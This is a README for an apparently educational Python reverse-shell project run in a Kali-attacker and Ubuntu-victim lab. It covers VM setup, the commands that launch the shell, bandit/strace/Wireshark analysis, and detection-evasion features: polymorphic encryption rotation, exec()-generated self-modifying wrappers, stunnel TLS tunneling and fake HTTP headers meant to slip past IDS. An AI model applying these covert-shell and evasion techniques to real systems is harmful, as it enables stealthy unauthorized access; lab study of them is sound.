# Shifty Shell :shell:

## Overview :globe_with_meridians:

**Shifty Shell** is a reverse shell framework written in Python that simulates an encrypted SSH-like connection between a victim and attacker machine. What makes it unique is its use of **polymorphic encryption**, **dynamic encryption algorithm switching**, and **network traffic obfuscation** to evade detection.

The tool is designed to showcase advanced evasion techniques used in offensive cybersecurity — such as runtime-generated wrappers, per-session key generation, and fake HTTP formatting — while remaining fully modular, readable, and reproducible.

Key Features:
- Dynamic RSA session key exchange
- Symmetric encryption using AES, ChaCha20, Camellia, or 3DES
- Runtime algorithm switching with the `rotate` command or automatic triggers
- Self-modifying code via randomized and `exec()`-generated wrappers
- Obfuscation using TLS (via `stunnel`) and fake HTTP headers
- Fully testable in VirtualBox using Kali (attacker) and Ubuntu (target) VMs

---

## Table of Contents :book:
- [Overview](#overview-globe_with_meridians)
- [Technologies Used](#technologies-used-wrench)
- [Setup Instructions](#setup-instructions-computer)
- [Usage Guide](#usage-guide-running)
- [Bonus Features](#bonus-features-gift)
- [Key Concepts](#key-concepts-key)
- [Author](#author-construction_worker)

---

## Technologies Used :wrench:

- **VirtualBox**:
    - Ubuntu VM (Target System)
    - Kali Linux VM (Attacker System)
- **Python 3.12.3** with `venv` for isolated environments
- **Cryptography**: `cryptography` package for secure RSA, AES, ChaCha20, Camellia, and 3DES encryption
- **Obfuscation Tools**:
    - `stunnel`: Tunnels TCP traffic over TLS to mimic HTTPS
- **Static Analysis**: `bandit` (Python security linter)
- **Dynamic Analysis**: `strace` (system call tracing)
- **Network Analysis**: `Wireshark` (PCAP capture and inspection)
- **Development Tools**:
    - Visual Studio Code + WSL Ubuntu for implementation
    - Git + Gitea for version control and repository hosting

---

## Setup Instructions :computer:

### Prerequisites

To complete this project successfully, you will need the following:

- **VirtualBox** installed on your host machine (e.g. Windows)
- **Kali Linux VM** – used as the **attacker**
- **Ubuntu Linux VM** – used as the **victim**
- **Bridged networking** enabled for both VMs so they are on the same subnet
- (Optional) **Shared folder** between your VM and host for copying files like PCAPs or screenshots
- **Python 3.10+** installed in both VMs

---

### Step-by-Step Setup of the Virtual Machines and Project Environment

This guide walks you through creating two virtual machines and setting up the project on each.

You will:
1. Set up a **Vanilla Ubuntu VM** in VirtualBox (target)
2. Set up a **Kali Linux VM** in VirtualBox (attacker)
3. Confirm network connectivity between the VMs
4. Clone the project and run the automatic setup scripts on each VM
5. Optionally configure a shared folder for moving files between VM and host


#### 1. Create and Start Both Virtual Machines in VirtualBox

You'll use two virtual machines in VirtualBox:
- **Ubuntu VM** – will act as the target
- **Kali VM** – will act as the attacker

- If you need to install VirtualBox, you can download it from <a href="https://www.virtualbox.org">https://www.virtualbox.org</a>


**🐧 A: Ubuntu VM (Vanilla Install) (Target)**

1. Download Ubuntu Desktop ISO

    - Visit: <a href="https://ubuntu.com/download/desktop">https://ubuntu.com/download/desktop</a>
    - Download the latest **Ubuntu Desktop 24.04.2 LTS** ISO file
    - The file will be named something like:
        ```
        ubuntu-24.04.2-desktop-amd64.iso
        ```
    - Save it somewhere safe, e.g. `C:/VMs/ISOs/`

2. Create a New VM in VirtualBox

    - You can find instructions on how to run a Ubuntu Desktop VM using VirtualBox in the <a href="https://ubuntu.com/tutorials/how-to-run-ubuntu-desktop-on-a-virtual-machine-using-virtualbox#1-overview">Ubuntu tutorials</a>, if needed 

    - In VirtualBox:
        - Click **New**
            - Name: `UbuntuVanillaVM`
            - Type: Linux
            - Version: Ubuntu (64-bit)
            - ISO image: Select the Ubuntu `.iso` file you downloaded
        - On "Unattended Install" tab: 
            - Create a user profile to be used for this VM only (change default username and password)
        - On "Hardware" tab, Set Memory:
            - RAM: 6-8 GB recommended (2048 MB (2 GB) minimum)
            - CPUs: 4 (recommended)
        - Hard Disk:
            - Select **Create a virtual hard disk now**
            - Hard Disk File Location and Size: Dynamically allocated
            - Size: **25 GB** (or more)
            - File Type: **VDI (VirtualBox Disk Image)**
            - Click **Finish**

3. If unattended installation runs smoothly, the VM may run it and then start the VM already. 
    - In that case, power off the VM from VirtualBox
    - Skip to step 5: "Configure Network Adapter"

4. Insert the Correct Ubuntu ISO, if needed (this may have been done correctly in step 2 already, but if it e.g. shows an "unattended" ISO file, try this)

    - Go to **Settings > Storage**
    - Under "Controller: IDE" → Click the CD icon "Add optical drive"
    - Select the Ubuntu `.iso` file you downloaded
    - Remove any "Unattended" file
    - Click **OK**

5. Configure Network Adapter (required!)

    - Go to **Settings > Network**
    - Set Adapter 1 to:
        - ✅ Enable Network Adapter
        - Attached to: **Bridged Adapter**
        - Name: your active internet adapter (e.g. Wi-Fi or Ethernet)
        - Click **OK**

5. Install Ubuntu, if needed (unattended installation may run smoothly through without opening the installer)

    - Please check out the <a href="https://ubuntu.com/tutorials/install-ubuntu-desktop#4-boot-from-usb-flash-drive">Ubuntu Desktop installation tutorial</a> for more details

    - Click **Start** to launch the VM
    - The VM will boot from the ISO
    
    >💡 Tip: If you see the desktop but still see an "Install Ubuntu" icon, double-click it to run the full installer.

    - Go through the installer::
        - Select language, accessibility, keyboard → your choice
        - Internet: **Use wired connection**
        - Try or Install: **Install Ubuntu**
        - Installation type: **Interactive Installation**
        - Applications: **Default selection**
        - Optimization: ✅ enable both options
        - Disk setup: **Erase disk and install Ubuntu** (only affects the virtual disk)
        - Create your account: create a username/password (e.g. `ubuntu-vm / ubuntu123`) (the username and password are local to this VM only)
        - Set timezone
        - Click **Install** and wait for completion
    
    > 💡 The installation may take several minutes.

6. Remove the ISO After Installation (if needed)

    - After install, the VM may boot into the ISO again
    - Shut down the VM
    - Go to **Settings > Storage**
    - If an ISO file exists under the CD icon, select it and click **Remove disk from virtual drive**
    - Start the VM again — it should now boot from the hard drive

7. Login and Check the Ubuntu VM IP Address

    - Start the VM, and login with the user account you created
    - Open a Terminal and run:
        ```bash
        ip a
        ```

    - Look for the `inet` line under `eth0` or `enp0s3`, e.g.:
        ```console
        inet 192.168.0.19
        ```

**🛡️ B. Kali Linux VM (Attacker)**

1. Download Kali Linux VM Image

    - Go to: <a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a>
    - Download the **Kali Linux VirtualBox image**

2. Extract the `.7z` File

    - Use a tool like 7-Zip or WinRAR to extract the `.7z` archive
    - After extraction, you should see a folder like: 
        ```
        kali-linux-2025.2-virtualbox-amd64/
        ├── kali-linux-2025.2-virtualbox-amd64.vdi    ← virtual hard disk
        ├── kali-linux-2025.2-virtualbox-amd64.vbox   ← optional (VirtualBox config)
        ```
    - You only need the `.vdi` file.

3. Create a New Kali Linux VM in VirtualBox

    - Open VirtualBox
    - Click "New"
        - On "Name and Operating System" tab, enter:
            - Name: `Kali Linux`
            - Type: Linux
            - Subtype: Debian
            - Version: Debian (64-bit)
        - Assign RAM and CPU on "Hardware" tab:  
            - Memory: 2048 MB (or more)
            - CPUs: 2 (optional, for better performance)
        - In the "Hard Disk" tab:
            - Select **Use an Existing Virtual Hard Disk File**
            - Click the folder icon and browse to the `.vdi` file you just extracted
            - Select it, then click **Finish**

4. Configure Kali VM Settings

    - Select your Kali VM → Click **Settings**

        A. Display > Screen
        - Video Memory: 128 MB
        - ✅ Enable 3D Acceleration

        B. Network
        - Set Adapter 1 to:
            - ✅ Enable Network Adapter
            - Attached to: **Bridged Adapter**
            (This must match what Ubuntu VM is using)
            - Name: your active internet adapter (e.g. Wi-Fi)
        - Click **OK**

5. Start Kali VM

    - Click **Start** to boot the VM
    - Login with default credentials:
        ```console
        Username: kali
        Password: kali
        ```
    - Open Terminal → run:: 
        ```bash
        ip a
        ```
    - Look for the `inet` line under `eth0`, e.g.:
        ```console 
        inet 192.168.0.20
        ```

---

#### 2. Confirm Network Connectivity

Make sure both VMs are on the same subnet, and can reach each other (e.g. both `192.168.0.x`).

- On **Kali VM**, run:
  ```bash
  ping <ubuntu_ip>
  ```

- On **Ubuntu VM**, run:
  ```bash
  ping <kali_ip>
  ```

Both should return successful `icmp_seq` replies.

---

#### 3. Clone the Repository (Optional)

You can clone the repository into your dev environment or directly into one of the VMs.

```bash
git clone https://github.com/HennaVenho/shifty-shell.git
cd shifty-shell
```

---

#### 4. Ubuntu VM Setup (Target)

1. Install SSH in Ubuntu VM terminal, if needed:

    - As you just created a vanilla Ubuntu VM, SSH may have to be installed manually in the Ubuntu VM
    - Check the SSH status in Ubuntu VM terminal: 
        ```bash
        sudo systemctl status ssh
        ```
    - If it shows `inactive` or `not found`, run:
        ```bash
        sudo apt update
        sudo apt install openssh-server
        sudo systemctl enable ssh
        sudo systemctl start ssh
        ```
        - Confirm with: 
            ```bash
            sudo systemctl status ssh
            ```
        - You should see `active (running)` in green.

2. Transfer and Run the Setup Script:

    - If you cloned the repo to a dev environment, you can copy the setup script only in the repo root
    - From your host:
        ```bash
        scp ubuntu_vm_setup.sh <ubuntu-vm-username>@<ubuntu-vm-ip>:~/
        ssh <ubuntu-vm-username>@<ubuntu-vm-ip>
        chmod +x ~/ubuntu_vm_setup.sh
        ./ubuntu_vm_setup.sh
        ```

        - The first time you SSH or SCP into a new machine, it probably gives a warning like: 
            ```
            The authenticity of host '192.168.0.19 (192.168.0.19)' can't be established.
            ED25519 key fingerprint is SHA256:+swA/hJHzxytHu2uepQaRrhO+a7d8ysKqAGesRVJ2Gk.
            This key is not known by any other names
            Are you sure you want to continue connecting (yes/no/[fingerprint])? 
            ```
        - This is normal, and it is just OpenSSH warning you: "We've never seen this server before. Are you sure it's the right one?"

    The `ubuntu_vm_setup.sh` script will:
    - Install Python packages and tools
    - Clone the `shifty-shell` repo
    - Create a Python virtual environment
    - Show IP address and SSH status

3. You Can Verify Environment in Ubuntu VM:

    ```bash
    cd ~/shifty-shell
    source venv/bin/activate
    python3 -m shell.reverse_shell <attacker_ip> <port>
    ```

---

#### 5. Kali VM Setup (Attacker)

1. Check SSH Service Status in Kali VM:
    ```bash
    sudo systemctl status ssh
    ```
    - If it's inactive or disabled:
        ```bash
        sudo systemctl enable ssh
        sudo systemctl start ssh
        ```
    - You should see `active (running)` in green.

2. Transfer and Run Setup Script

   - From your host:
        ```bash
        scp attacker_vm_setup.sh kali@<kali-ip>:~/
        ssh kali@<kali-ip>
        chmod +x ~/attacker_vm_setup.sh
        ./attacker_vm_setup.sh
        ```

   The `attacker_vm_setup.sh` script will:
   - Clone the repo
   - Install required Python packages
   - Setup `venv` and install dependencies
   - Print IP and SSH status

3. Start the Server:
   ```bash
   cd ~/shifty-shell
   source venv/bin/activate
   python3 -m server.attacker_server
   ```

After the setup is done, please check [Usage Guide](#usage-guide-running) for instructions on how to launch the shell.   

---

### (Optional) Create a Shared Folder Between Host and VM for Easier Output Sharing 

- This creates a live folder that both your VM (Ubuntu VM used here) and your host OS (e.g. Windows/WSL) can access.

1. Shut down your VM

2. In VirtualBox, go to the VM > Settings > Shared Folders

3. Click the folder icon → Add a shared folder
    - Folder Path: Choose a real folder on your Host (e.g. Windows) system (e.g. `C:\Users\YourName\UbuntuVMShare`)
    - Folder Name: e.g. `UbuntuVMShare` (this will be used in Ubuntu VM)
    - Check: ✅ Auto-mount 

4. Start the VM again

    - In Ubuntu VM, mount it:
        - If not auto-mounted, run:
            ```bash
            sudo mkdir /mnt/UbuntuVMShare
            sudo mount -t vboxsf UbuntuVMShare /mnt/UbuntuVMShare
            ```
        - A. Now you can copy a file from Ubuntu VM to your OS:
            ```bash
            cp <filename> /mnt/UbuntuVMShare/
            ```
            - You'll find `<filename>` in your OS folder
        - B. You can also copy a file from your OS to the VM by placing it in the shared folder and running in the VM: 
            ```bash
            cp /mnt/UbuntuVMShare/<filename> <file-name-in-UbuntuVM>
            ```
---

### Safety Tips When Using Bridged Networking

1. Be Aware of Other Devices on the Network
    - Only target the IP of Ubuntu VM

2. Disable Services You Don't Use
    - Don't leave reverse shells or listeners running indefinitely
    - Shutdown Ubuntu VM when you're not using it

3. Temporarily Disabling Your OS Firewall
    - Only disable firewall if necessary (e.g. to test ping or reverse shell from Ubuntu VM to Kali VM), and always turn it back on afterward

4. Clean up Exploits After Testing
    - If you upload a reverse shell to Ubuntu VM, delete it after the test so it doesn't stay open by accident.

---

### Network Troubleshooting Checklist

| Test                      | Command                                          | Expected Result               |
| ------------------------- | ------------------------------------------------ | ----------------------------- |
| Check VM IP               | `ip a`                                           | Bridged IP (192.168.x.x)      |
| Ping Kali from Ubuntu     | `ping <kali-ip>`                                 | Successful ping replies       |
| Ping Ubuntu from Kali     | `ping <ubuntu-vm-ip>`                            | Successful ping replies       |
| Check port listening Kali | `sudo netstat -tulnp`                            | grep 4545                     |
| Check SSH service Ubuntu  | `sudo systemctl status ssh`                      | Active                        |
| Verify Python environment | `source venv/bin/activate` + `python3 --version` | Python 3.x active             |
| Verify Git remote         | `git remote -v`                                  | HTTPS URL (or SSH if allowed) |

> **Note:**
> Always ensure that the bridged adapter is properly configured in VirtualBox settings for both VMs.

---

## Usage Guide :running:

### 1. Basic Shell Usage

This section explains how to launch and use the reverse shell before adding any TLS obfuscation like `stunnel`.

--- 

#### ✅ Step 1: Start the Attacker Server (Kali VM)

1. Open a terminal in the Kali VM.

2. Navigate to the project directory and activate the Python virtual environment:
    ```bash
    cd ~/shifty-shell
    source venv/bin/activate
    ```

3. Start the server:
    ```bash
    python3 -m server.attacker_server
    ```
    - `-m` flag enables Python to treat `shifty-shell` as the root package, and imports work as intended

    You should see something like:
    ```
    [+] Initial encryption method: AES
    [*] Listening on 0.0.0.0:4545
    ```
---

#### ✅ Step 2: Start the Reverse Shell (Ubuntu VM)

1. Open a terminal in the Ubuntu VM.

2. Navigate to the project directory and activate the virtual environment:
    ```bash
    cd ~/shifty-shell
    source venv/bin/activate
    ```

3. Connect to the attacker by running:
    ```bash
    python3 -m shell.reverse_shell <attacker_ip> 4545
    ```

    - Replace <attacker_ip> with your Kali VM’s IP (e.g. 192.168.0.20).

    You should see:
    ```
    [*] Connecting to attacker...
    [+] Connected!
    [DEBUG] Generated session key (hex): ...
    [+] Session key sent.
    [+] Initial encryption method: AES
    ```

---

#### ✅ Step 3: Use the Shell From the Kali VM

- Back in the Kali terminal (where the server is running), you will now see:
    ```
    [+] Connection from ('192.168.0.19', 36944)
    [Victim] <base64 marker>
    [+] Session key established.
    ```

- You can now enter commands:
    ```bash
    Shell> whoami
    ```

- The Ubuntu VM will execute the command, and return the result, e.g.:
    ```
    ubuntu-vm
    ```

- Try these example commands:
    - `whoami` — Print username
    - `pwd` — Print current working directory
    - `ls -la` — List directory contents
    - `exit` — Cleanly terminate the shell session

---

#### 🔁 Switching Encryption Algorithms (Bonus)

- At any time during the session, you can type:
    ```bash
    Shell> rotate
    ```
- This command instructs the victim to randomly switch to a new symmetric encryption algorithm. The new method is logged in the console:
    ```
    [+] Switching encryption to CHACHA20
    ```
- This dynamic switching is part of the polymorphic encryption layer — a key feature of this implementation.

---

### 2. Analysis Tools

This section covers three analysis types that help validate how your reverse shell works:
- **Static Analysis** — Examines source code without executing it
- **Dynamic Analysis** — Observes behaviour at runtime
- **Network Analysis** — Monitors traffic between attacker and victim

---

#### 🧠 A. Static Code Analysis with `bandit`

- `bandit` identifies common security issues in Python code by scanning files without running them.

1. Install Bandit (if not already installed):
    ```bash
    pip install bandit
    ```

2. Scan your source code directories:
    ```bash
    bandit -r shell/ server/
    ```

3. Review the results:
    - `bandit` will flag use of `exec()` and dynamic code execution.
    - These are **intentional** in this project to implement polymorphic behaviour.
    - Could add `# nosec` to suppress known safe uses, e.g.:
        ```
        python
        exec(func_code, {'encrypt_func': encrypt_func}, local_scope)  # nosec
        ```
        - But I deliberately did not use `# nosec` annotations to suppress any Bandit warnings to ensure transparency

    - See example `bandit` report: [bandit_report.txt](./reports/bandit_report.txt)

---

#### ⚙️ B. Dynamic Runtime Behaviour Analysis with `strace`

- `strace` traces all system calls made by a running program.

1. Start a syscall trace (on Ubuntu VM):
    ```bash
    strace -f -o strace.log python3 -m shell.reverse_shell <attacker_ip> 4545
    ```
    - Explanation of flags:
        - `-f`: follows any child processes (important for `subprocess`)
        - `-o strace.log`: writes the output to a log file for easier inspection

2. Run a few shell commands from the attacker server.

    - See screenshot of running `strace`: [reverse-shell-run-with-strace.jpg](./screenshots/reverse-shell-run-with-strace.jpg)

3. Inspect the trace output:
    ```bash
    less strace.log
    ```

4. Look for behaviour like:
    - Dynamic system calls (`read`, `write`, `execve`, etc.)
    - Temporary files, memory allocations
    - Session-to-session differences in activity
    - See example `strace` logs: [strace1.log](./reports/strace1.log) and [strace2.log](./reports/strace2.log), as well as
        [strace3-stunnel.log](./reports/strace3-stunnel.log) run with `stunnel` 
5. Cross-reference with debug output:
    - If you're running with debug prints enabled, you'll also see helpful logs like:
        ```text
        [DEBUG] Using encrypt_wrapper: wrapper_v3
        [DEBUG] Using decrypt_wrapper: wrapper_v2
        ```

---

#### 🌐 C. Network Traffic Analysis with Wireshark

- Validate that the shell communicates securely and that traffic is encrypted and obfuscated.

**Step-by-Step:**

1. Identify your network interface (on Kali VM):
    ```bash
    ip a
    ```
    - Look for something like `eth0` or `enp0s3`

2. Start Wireshark (on Kali):
    ```bash
    wireshark
    ```
    - Select the correct interface and start capturing
    - Optional: filter by port to narrow view:
        ```
        tcp.port == 4545
        ```

3. Run the shell:
    - On Kali:
        ```bash
        python3 -m server.attacker_server
        ```
    - On Ubuntu:
        ```bash
        python3 -m shell.reverse_shell <attacker_ip> 4545
        ```

4. Type a few commands in the shell, such as:
    ```bash
    whoami
    ls -la
    pwd
    rotate
    ```

5. Stop capture in Wireshark, then:
    - Save the capture, e.g.:
        ```
        File → Save As → reverse-shell-capture1.pcapng
        ```

6. Inspect the packets:
    - You should not see plaintext commands.
    - Payloads will appear as base64-encoded or unreadable binary blobs.
    - Each session has a unique RSA key exchange at the start.
    - Commands and responses will differ in size even for repeated inputs, due to:
        - Polymorphic wrappers
        - Different symmetric encryption methods
        - Random session key per run
    
    - See example Wireshark captures from two consecutive sessions: [reverse-shell-capture1.pcapng](./reports/reverse-shell-capture1.pcapng) and [reverse-shell-capture2.pcapng](./reports/reverse-shell-capture2.pcapng)
    - Here are screenshots from the VMs while running above captures, where differing sessions keys are clearly visible:
        [reverse-shell-wireshark-capture1.jpg](./screenshots/reverse-shell-wireshark-capture1.jpg) and         [reverse-shell-wireshark-capture2.jpg](./screenshots/reverse-shell-wireshark-capture2.jpg)
    - This screenshot from Wireshark displays data hashing from capture1: [wireshark-capture1-data-hashing.jpg](./screenshots/wireshark-capture1-data-hashing.jpg)
    - This screenshot from Wireshark displays differing encrypted sessions keys for the two sessions: [wireshark-encrypted-session-keys.jpg](./screenshots/wireshark-encrypted-session-keys.jpg)

---

#### ✅ Summary:

| **Layer** | **What You Validate**               | **What to Look For**                     |
| --------- | ----------------------------------- | ---------------------------------------- |
| Static    | Code safety & vulnerabilities       | Intentional use of `exec`, key handling  |
| Runtime   | Dynamic behaviour & execution paths | Varying syscall activity across sessions |
| Network   | Secure and obfuscated transmission  | Encrypted payloads, per-session patterns |

These analysis tools confirm that your reverse shell implementation:
- Protects data using layered encryption
- Exhibits self-modifying / polymorphic characteristics
- Produces encrypted, non-repetitive traffic even for repeated input

---

### 3. 🕵️ Obfuscating Communication with `stunnel`

To further conceal traffic patterns and encrypt metadata like connection setup, this project supports tunneling all reverse shell traffic through **TLS** (Transport Layer Security) using `stunnel`.

This simulates HTTPS-style transport over the wire and allows for Wireshark analysis of encrypted streams.

---

#### 🔐 What is `stunnel`?

- `stunnel` is a TLS wrapper that allows you to encrypt arbitrary TCP traffic.
- In this setup:
    - **Attacker (Kali)** runs the `attacker_server.py` on port `4545`
    - `stunnel` exposes this server as a **TLS endpoint** on port `4747`
    - **Victim (Ubuntu)** connects to `127.0.0.1:5555`, which the local `stunnel` forwards securely to the attacker's `4747`

---

#### 🧪 Before You Begin: Capture with Wireshark

- To analyze the TLS obfuscation later, start Wireshark **before** launching `stunnel` or the shell.
    - Run Wireshark on the **Kali VM**
    - Start capture on the interface used by the bridged adapter
    - Apply this capture filter to isolate only stunnel traffic:
        ```
        tcp.port == 4747
        ```
        Port 4747 is the external-facing TLS endpoint of the stunnel server with this setup.

---

#### ✅ Step-by-Step Instructions

1. Confirm `stunnel` Is Installed
    - If you used the setup scripts, `stunnel4` should already be installed. If not, install it on both VMs:
        ```bash
        sudo apt update
        sudo apt install stunnel4
        ```

2. Review the Example Configuration Files
    - Located under:
        ```bash
        configs/stunnel_server.conf.example
        configs/stunnel_client.conf.example
        ```
    - These are ready-to-use templates. **Copy them to your project root** as `.conf` files, and adjust values as needed.
        ```bash
        cp configs/stunnel_server.conf.example stunnel_server.conf
        cp configs/stunnel_client.conf.example stunnel_client.conf
        ```
        ⚠️ Never commit `.pem` certificate files or other secrets to Git.

3. Generate Self-Signed TLS Certificate (on Kali Attacker)
    - To simulate a legitimate HTTPS server:
        ```bash
        openssl req -new -x509 -days 365 -nodes -out stunnel.pem -keyout stunnel.pem
        ```
        - You'll be prompted to enter certificate details — leave them blank or add dummy values.
        - This will create a `.pem` file containing **both private key and certificate**.
        - See screenshot of certificate creation: [generate-self-signed-TLS-certificate.jpg](./screenshots/generate-self-signed-TLS-certificate.jpg)

4. Configure `stunnel` Server (on Kali)
    - Open your new `stunnel_server.conf` and update the `cert` path:
        ```
        [reverse_shell]
        accept = 0.0.0.0:4747
        connect = 127.0.0.1:4545
        cert = /full/path/to/stunnel.pem
        ```
        - Explanation:
            - `accept`: port `4747` will receive TLS-wrapped shell traffic
            - `connect`: forwards decrypted data to local reverse shell server

5. Start `stunnel` and Shell Server (on Kali)
    - In Terminal 1:
        ```bash
        cd ~/shifty-shell
        source venv/bin/activate
        python3 -m server.attacker_server
        ```
    - In Terminal 2:
        ```bash
        cd shifty-shell
        source venv/bin/activate
        stunnel stunnel_server.conf
        ```
    - Now Kali is ready to accept **TLS-encrypted** traffic on port 4747 and forward it internally to `4545`

6. Configure `stunnel` Client (on Ubuntu)
    - Edit your copied `stunnel_client.conf` with your actual Kali VM IP:
        ```
        [reverse_shell]
        accept = 127.0.0.1:5555
        connect = <ATTACKER_KALI_IP>:4747
        ```
    - This allows the reverse shell client to connect to `localhost:5555`, and the local `stunnel` instance will tunnel that securely to the Kali machine.

7. Start `stunnel` and Reverse Shell (on Ubuntu)
    - In Terminal 1:
        ```bash
        cd ~/shifty-shell
        source venv/bin/activate
        stunnel stunnel_client.conf
        ```
    - In Terminal 2:
        ```bash
        python3 -m shell.reverse_shell 127.0.0.1 5555
        ```
    - Your shell now communicates over a **TLS-secured tunnel**
    - The attacker only sees traffic arriving on port `4747`, not `4545`
    
    - See example Wireshark captures from two consecutive sessions run with `stunnel`: [stunnel-reverse-shell-capture1.pcapng](./reports/stunnel-reverse-shell-capture1.pcapng) and [stunnel-reverse-shell-capture2.pcapng](./reports/stunnel-reverse-shell-capture2.pcapng)
    - Here are screenshots from Wireshark while running above captures:
        [reverse-shell-wireshark-capture3-with-stunnel.jpg](./screenshots/reverse-shell-wireshark-capture3-with-stunnel.jpg) and [reverse-shell-wireshark-capture4-with-stunnel.jpg](./screenshots/reverse-shell-wireshark-capture4-with-stunnel.jpg)

    - See screenshots from Ubuntu VM terminal of running reverse shell with `stunnel` with raw payload debug prints active and HTTP headers visible:     
        [reverse-shell-ubuntu-stunnel-and-fake-http-headers-with-raw-payload-debug-prints1.jpg](./screenshots/reverse-shell-ubuntu-stunnel-and-fake-http-headers-with-raw-payload-debug-prints1.jpg) and   
        [reverse-shell-ubuntu-stunnel-and-fake-http-headers-with-raw-payload-debug-prints2.jpg](./screenshots/reverse-shell-ubuntu-stunnel-and-fake-http-headers-with-raw-payload-debug-prints2.jpg)

---

#### 📡 What You'll See in Wireshark

- You should observe:
    - `TLSv1.2` or `TLSv1.3` handshake packets:
        - `Client Hello`
        - `Server Hello`
        - `Encrypted Handshake Message`
    - Ongoing traffic:
        - Labeled as `Application Data`
        - Appears as unreadable blobs — encrypted
        - Follow → TCP Stream will reveal only gibberish (unlike the unencrypted version)
    - This validates that:
        - Traffic is encrypted (you can't see raw commands).
        - Payload size varies across sessions.
        - There's no plaintext handshake from the reverse shell (because TLS hides it all).
        - This is exactly what real HTTPS traffic looks like, under the hood

---

#### ✅ TLS Obfuscation Summary

| Goal                              | Achieved By                               |
| --------------------------------- | ----------------------------------------- |
| Hide raw commands                 | TLS encryption over the wire              |
| Encrypt metadata (e.g. handshake) | TLS handshake replaces plain socket setup |
| Simulate HTTPS traffic            | TLS handshake + Application Data label    |
| Per-session uniqueness            | TLS + dynamic encryption key inside shell |

---

## Bonus Features :gift:

- Dynamic Encryption Rotation: 
    - The application **dynamically rotates between four symmetric encryption algorithms** during runtime: 
        - `AES`, `ChaCha20`, `Camellia`, and `3DES` *(legacy; included for demonstration)*
    - Switching occurs **automatically every 15–30 seconds**, using a randomized timer on the attacker side.
    - The attacker can also manually trigger a switch at any time by typing: `rotate`
- Seamless, Secure Transitions:
    - The application maintains secure communication and data integrity despite frequent changes in encryption algorithms.
    - **Symmetric session key** remains constant throughout the connection and is shared securely via **RSA key exchange** at the beginning.
    - All algorithms are implemented with consistent patterns:
        - Key derivation via PBKDF2 (with salt)
        - Base64 encoding for transmission
        - Exception-safe wrappers
    - This ensures that messages remain decryptable across transitions, and encrypted outputs are always consistent with the expected format.
    - This was validated through testing, Wireshark captures, and `strace` logging, confirming that transitions do not result in corrupted payloads.
- Self-Modifying Polymorphic Wrappers: 
    - Each encryption and decryption call is dynamically wrapped using **randomly selected logic paths**, including:
        - Predefined wrapper functions with benign mutations
        - **Exec-generated functions** created at runtime from stringified code
    - These wrappers modify control flow and internal names, introducing polymorphic mutation while preserving behaviour.
    - This technique makes the binary execution graph more variable across runs and adds resistance to static pattern detection.
- Traffic Obfuscation Techniques: 
    - Two key strategies disguise the shell's traffic on the wire:
        1. TLS Wrapping via `stunnel`
            - All traffic is tunneled through `stunnel`, transforming the communication into **TLS-encrypted TLS/HTTPS** sessions (typically port `4747`).
            - From a packet inspection perspective, traffic appears identical to standard HTTPS — with TLS handshake and encrypted application data.
        2. Fake HTTP Header Injection
            - Every plaintext command is first prefixed with a **valid-looking HTTP request header**:
                ```
                http
                POST /api/endpoint HTTP/1.1
                Host: example.com
                ...
                ```
            - The entire message (headers + command) is then encrypted and base64-encoded.
    - In packet captures, this results in encrypted blobs that mimic the shape of HTTP requests inside a TLS tunnel, blending with normal web traffic.
- Evasion and Legitimate Traffic Mimicry:
    - Wireshark captures show:
        - `TLSv1.3` handshakes
        - `Application Data` payloads without visible plaintext
        - Consistent session separation due to rotating keys and headers
    - Together, this makes the tool's network footprint **nearly indistinguishable from legitimate HTTPS API calls**.
    - This helps evade detection by intrusion detection systems (IDS) or traffic heuristics, especially in environments with high TLS traffic.
- Additional Enhancements:
    - Modular architecture (`shell/`, `server/`, `utils.py`, etc.) promotes code clarity
    - Well-commented functions and doc-style blocks throughout
    - All features are implemented with no third-party dependencies beyond `cryptography`, for maximum portability
    - Compatible with **Wireshark**, **Bandit**, **strace**, and other analysis tools

---

## Key Concepts :key:

<details id="core-principles-of-polymorphic-encryption-and-its-relevance-in-cybersecurity">
<summary>Core Principles of Polymorphic Encryption and Its Relevance in Cybersecurity</summary>

- **Polymorphic encryption** is a technique where the encryption logic or its wrapping changes during each execution, even though the intended functionality stays the same.
- This is commonly used in malware to **evade signature-based detection**, since the encrypted payload and the encryption logic mutate over time.
- In this project:
    - Every message is encrypted using a randomly selected encryption wrapper.
    - The algorithm itself can switch between AES, ChaCha20, Camellia, or 3DES during runtime.
    - Wrappers are picked dynamically from multiple predefined versions or generated at runtime using `exec()`.
- As a result, **the appearance of the encrypted data changes continuously**, making it difficult for intrusion detection systems (IDS) or packet analyzers to spot a consistent signature or pattern.
- Polymorphism ensures that **even the same command run twice appears different** at the network and memory level. 

</details>

<details id="intricacies-of-self-modifying-code-and-its-role-in-evading-detection-mechanisms">
<summary>Intricacies of Self-modifying Code and Its Role in Evading Detection Mechanisms</summary>

- **Self-modifying code (SMC)** refers to programs that can change their structure or logic at runtime.
- In offensive security, SMC is used to **hide real program logic from static analysis**, such as antivirus scanners or reverse engineers.
- In this project:
    - SMC is simulated through dynamically generated **encryption and decryption wrappers**.
    - Each wrapper function uses slightly different logic (e.g. string reversal, dummy loops, or alternate control flow).
    - Some wrappers are built at runtime using `exec()` with a generated function body.
    - This adds polymorphic variety not just to data, but to the code itself. 
- The program's execution flow becomes **non-deterministic** across runs, making behavioural analysis harder for detection systems.
- Because the encryption logic mutates continuously, even code-tracing tools like `strace` or memory dump analysis will see **different encryption function shapes** every session.

</details>

<details id="differences-between-static-polymorphic-and-metamorphic-code">
<summary>Differences Between Static, Polymorphic, and Metamorphic Code</summary>

| Code Type            | Definition                               | Characteristics                                       |
| -------------------- | ---------------------------------------- | ----------------------------------------------------- |
| **Static Code**      | Code whose structure and content         | - Same binary or script every time                    |
|                      | remain the same across executions        | - Easy to fingerprint                                 |
|                      |                                          | - Detectable via hash                                 |
| -------------------- | ---------------------------------------- | ----------------------------------------------------- |
| **Polymorphic Code** | Code that mutates its **form or          | - Code structure (or payload encryption) changes      |
|                      | encryption** each run, but performs the  | - Core logic unchanged                                |
|                      | same behaviour                           | - Harder to detect with signatures                    |
| -------------------- | ---------------------------------------- | ----------------------------------------------------- |
| **Metamorphic Code** | Code that rewrites its own **logic or    | - Changes instructions, control flow, register usage  |
|                      | structure** entirely to achieve the same | - Very hard to detect                                 |
|                      | outcome                                  | - Requires more resources and complexity              |

- In this project:
    - **polymorphism** is simulated using:
        - Runtime wrapper variation (`polymorph.py`)
        - Algorithm switching (`rotate` or timer)
    - We touch on **metamorphic** ideas by dynamically generating encryption wrappers using `exec()`, which slightly rewrites how each message is handled.

</details>

